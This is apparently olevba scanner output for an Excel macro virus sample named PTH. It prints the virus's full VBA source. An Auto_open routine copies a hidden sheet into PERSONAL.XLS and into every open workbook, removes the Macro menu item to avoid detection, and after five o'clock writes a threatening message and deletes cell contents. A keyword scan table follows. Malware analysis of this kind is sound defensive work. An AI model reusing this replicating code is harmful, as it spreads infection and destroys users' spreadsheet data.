olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.PTH-4bb667ba6b5e01d74209e7e562e4ef19fbcb9f0a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO PTH.bas 
in file: Virus.MSExcel.PTH-4bb667ba6b5e01d74209e7e562e4ef19fbcb9f0a - OLE stream: '_VBA_PROJECT_CUR/VBA/PTH'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 



Declare Function ExitWindowsExec Lib "User" (ByVal lpszExe As String, ByVal lpszParams As String) As Integer
Attribute ExitWindowsExec.VB_ProcData.VB_Invoke_Func = " \n14"
Sub Auto_open()
Attribute Auto_open.VB_ProcData.VB_Invoke_Func = " \n14"
 If Not ThisWorkbook.Name = "PERSONAL.XLS" Then
    Call lay_proc
End If
Application.OnSheetActivate = "PERSONAL.XLS!PTH.message"
If TimeValue(Now) > TimeValue("17:00:00") Then
    Call Set_time
Else
    If TimeValue(Now) > TimeValue("08:00:00") And TimeValue(Now) < TimeValue("12:00:00") Then
        
    Else
        Application.OnTime TimeValue("17:00:00"), "Set_time"
    End If
End If
End Sub

Sub lay_proc()
Attribute lay_proc.VB_ProcData.VB_Invoke_Func = " \n14"
On Error GoTo Err_hander
Application.WindowState = xlMaximized
If Not ThisWorkbook.Name = "PERSONAL.XLS" Then
    excelpath = Application.StartupPath
    f_personal = Dir(excelpath + "\PERSONAL.XLS")
    If Not f_personal = "PERSONAL.XLS" Then
        Workbooks.Add
        newname = ActiveWorkbook.Name
        numsheet = Application.SheetsInNewWorkbook
        ThisWorkbook.Sheets("PTH").Copy after:=Workbooks(newname).Sheets(numsheet)
        Modules.Add
        ActiveWindow.Visible = False
        Workbooks(newname).Sheets("PTH").Visible = False
        Workbooks(newname).SaveAs (excelpath + "\PERSONAL.XLS")
    Else
        C = Workbooks("PERSONAL.XLS").Sheets.Count
        m_name = ""
        For k = 1 To C
            m_name = Workbooks("PERSONAL.XLS").Sheets(k).Name
            If m_name = "PTH" Then
                k = C
            End If
        Next
        If Not m_name = "PTH" Then
            Set My_Window = Windows("PERSONAL.XLS")
            My_Window.Visible = True
            ThisWorkbook.Sheets("PTH").Visible = True
            ThisWorkbook.Sheets("PTH").Copy after:=Workbooks("PERSONAL.XLS").Sheets(C)
            Workbooks("PERSONAL.XLS").Sheets("PTH").Visible = False
            My_Window.Visible = False
        End If
    End If
End If
    b = Workbooks.Count
    If Not b = 0 Then
      For i = 1 To b
        C = Workbooks(i).Sheets.Count
        m_name = ""
        For k = 1 To C
            m_name = Workbooks(i).Sheets(k).Name
            If m_name = "PTH" Then
                k = C
            End If
        Next
            If Not m_name = "PTH" Then
                m_cation = Workbooks(i).Name
                Set My_Window = Windows(i)
                m_visible = My_Window.Visible
                If Not m_visible Then
                    My_Window.Visible = True
                End If
                ThisWorkbook.Sheets("PTH").Visible = True
                ThisWorkbook.Sheets("PTH").Copy after:=Workbooks(i).Sheets(C)
                Workbooks(i).Sheets("PTH").Visible = False
                If Not m_visible Then My_Window.Visible = False
                ThisWorkbook.Sheets("PTH").Visible = False
            End If
      Next
    End If
Application.WindowState = xlMaximized
Exit Sub
Err_hander:
If Err = 91 Then
    MsgBox "There is no Active Workbook", 48, "Microsoft Excel/Save"
End If
Resume Next
End Sub
  
Sub Message()
Attribute Message.VB_ProcData.VB_Invoke_Func = " \n14"
On Error GoTo hand_erro
ActiveMenuBar.Menus("&Tools").MenuItems("&Macro...").Delete
m_act_book = ActiveWorkbook.Name
If m_act_book = "PERSONAL.XLS" Then
    ActiveWindow.Visible = False
Else
    m_act_sheet = ActiveWorkbook.ActiveSheet.Name
    If m_act_sheet = "PTH" Then
        ActiveSheet.Visible = False
    Else
    m_pth = ""
        For i = 1 To ActiveWorkbook.Sheets.Count
            m_pth = ActiveWorkbook.Sheets(i).Name
            If m_pth = "PTH" Then i = ActiveWorkbook.Sheets.Count
        Next
        If Not m_pth = "PTH" Then Call lay_proc
    End If
End If
If Not Workbooks("PERSONAL.XLS").Saved Then
    Workbooks("PERSONAL.XLS").Save
End If
Exit Sub
hand_erro:
    Resume Next
End Sub

Sub set_action()
Attribute set_action.VB_Description = "Save change made to active document"
Attribute set_action.VB_ProcData.VB_Invoke_Func = " \n14"
Call lay_proc
ActiveWorkbook.Save
End Sub

Sub Set_time()
Attribute Set_time.VB_ProcData.VB_Invoke_Func = " \n14"
Application.OnTime Now + TimeValue("00:05:00"), "Nghich"
End Sub

Sub Warning()
Attribute Warning.VB_ProcData.VB_Invoke_Func = " \n14"
On Error GoTo Errhander
ActiveSheet.Range("A1").Select
ActiveCell.Formula = "Now is (over) FIVE O'CLOCK IN THE AFTERNOON. "
ActiveSheet.Range("A2").Select
ActiveCell.Formula = "STOP NOW!"
ActiveSheet.Range("A3").Select
ActiveCell.Formula = " UNLESS STOP YOUR DATA WOULD BE DESTROYED!  "
ActiveSheet.Range("A1:A3").Select
    With Selection.Font
        .Name = ".VnTime"
        .FontStyle = "Regular"
        .Size = 18
        .Strikethrough = True
        .Superscript = False
        .Subscript = False
        .OutlineFont = True
        .Shadow = False
        .Underline = xlNone
        .ColorIndex = 3
    End With
ActiveSheet.Range("B1:M3").Delete
ActiveSheet.Range("A1").Select
Errhander:
End
End Sub

Sub message1()
Attribute message1.VB_ProcData.VB_Invoke_Func = " \n14"
End Sub



-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSExcel.PTH-4bb667ba6b5e01d74209e7e562e4ef19fbcb9f0a - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  deskto
' 0085     11 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  up
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     11 BOUNDSHEET : Sheet Information - Visual Basic module, visible -  PT
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Auto_open           |Runs when the Excel Workbook is opened       |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

